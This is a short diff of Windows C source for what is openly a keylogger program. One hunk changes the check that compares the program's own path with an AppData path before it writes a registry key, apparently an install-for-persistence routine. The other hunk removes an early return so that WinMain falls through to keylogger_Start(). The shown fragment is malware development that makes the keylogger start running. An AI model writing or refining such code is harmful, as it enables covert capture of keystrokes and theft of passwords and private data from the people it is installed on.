@@ -61,7 +61,7 @@ void main_config()
 
     strncpy(path, main_globalPath, lasSplit);
 
-    if(strcmp(main_globalPath, appdata_path)) //ako NE sa ednakvi
+    if(strncmp(main_globalPath, appdata_path, strlen(appdata_path))) //ako NE sa ednakvi
     {
         HKEY hkey;
         DWORD dwDispos;
@@ -106,8 +106,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         {   
             main_config(); 
         }
-        
-        return 0;
     }
     
     keylogger_Start();
